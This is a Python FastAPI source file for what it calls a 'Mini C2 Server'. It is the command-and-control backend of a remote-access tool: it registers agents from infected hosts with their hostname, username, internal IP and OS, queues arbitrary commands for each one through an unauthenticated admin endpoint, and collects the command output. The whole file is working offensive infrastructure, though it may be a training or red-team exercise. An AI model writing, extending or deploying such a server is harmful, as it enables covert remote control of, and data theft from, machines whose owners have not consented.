from fastapi import FastAPI, Depends, HTTPException
from sqlmodel import Session, select
from contextlib import asynccontextmanager
from datetime import datetime, timezone

from api.schemas import (
    AgentCheckIn, 
    TaskRequest, 
    CheckInResponse, 
    TaskResponse, 
    AdminTaskResponse,
    TaskResult
)
from core.database import create_db_and_tables, get_session
from core.models import Agent, Task

# --- LIFESPAN ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    create_db_and_tables()
    yield

app = FastAPI(title="Mini C2 Server", lifespan=lifespan)

# --- ROUTES ---

# 1. Check-in
@app.post("/api/v1/checkin", response_model=CheckInResponse)
async def agent_checkin(data: AgentCheckIn, session: Session = Depends(get_session)) -> CheckInResponse:
    print(f"🔔 CHECK-IN: {data.hostname} ({data.agent_id})")
    
    # Check if agent exists
    agent = session.get(Agent, data.agent_id)
    if not agent:
        # Create new agent
        agent = Agent(
            id=data.agent_id,
            hostname=data.hostname,
            username=data.username,
            internal_ip=data.internal_ip,
            os_version=data.os_version
        )
        session.add(agent)
    else:
        # Update existing agent
        agent.last_seen = datetime.now(timezone.utc)
        agent.hostname = data.hostname
        agent.username = data.username
        agent.internal_ip = data.internal_ip
        agent.os_version = data.os_version
        session.add(agent)
    
    session.commit()
    session.refresh(agent)

    return CheckInResponse(status="registered", message="Bienvenue")

# 2. Polling
@app.get("/api/v1/tasks/{agent_id}", response_model=TaskResponse)
async def get_tasks(agent_id: str, session: Session = Depends(get_session)) -> TaskResponse:

    # Get pending tasks for this agent
    statement = select(Task).where(Task.agent_id == agent_id, Task.status == "pending").order_by(Task.created_at)  # type: ignore # Mypy sees datetime
    results = session.exec(statement)
    task = results.first()
    
    if task:
        print(f"📤 ENVOI: '{task.command}' -> {agent_id}")
        # Mark as sent
        task.status = "sent"
        session.add(task)
        session.commit()
        return TaskResponse(task_id=task.id, command=task.command)

    return TaskResponse(command=None)

# 3. Post Results
@app.post("/api/v1/results", response_model=dict)
async def post_results(result: TaskResult, session: Session = Depends(get_session)):
    task = session.get(Task, result.task_id)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    task.result = result.result
    task.status = "completed"
    task.executed_at = datetime.now(timezone.utc)

    session.add(task)
    session.commit()

    print(f"📥 RÉSULTAT REÇU pour Tâche #{task.id}")
    return {"status": "success"}

# 4. Admin
@app.post("/api/v1/admin/tasks", response_model=AdminTaskResponse)
async def add_task(task_req: TaskRequest, session: Session = Depends(get_session)) -> AdminTaskResponse:
    
    # Verify agent exists
    agent = session.get(Agent, task_req.agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")

    new_task = Task(
        agent_id=task_req.agent_id,
        command=task_req.command,
        status="pending"
    )
    session.add(new_task)
    session.commit()
    session.refresh(new_task)
    
    # Calculate position (count pending tasks for this agent, including the one just added)
    statement = select(Task).where(Task.agent_id == task_req.agent_id, Task.status == "pending")
    pending_count = len(session.exec(statement).all())
    
    print(f"✅ TÂCHE AJOUTÉE: '{task_req.command}' (ID: {new_task.id})")

    return AdminTaskResponse(status="queued", position=pending_count)
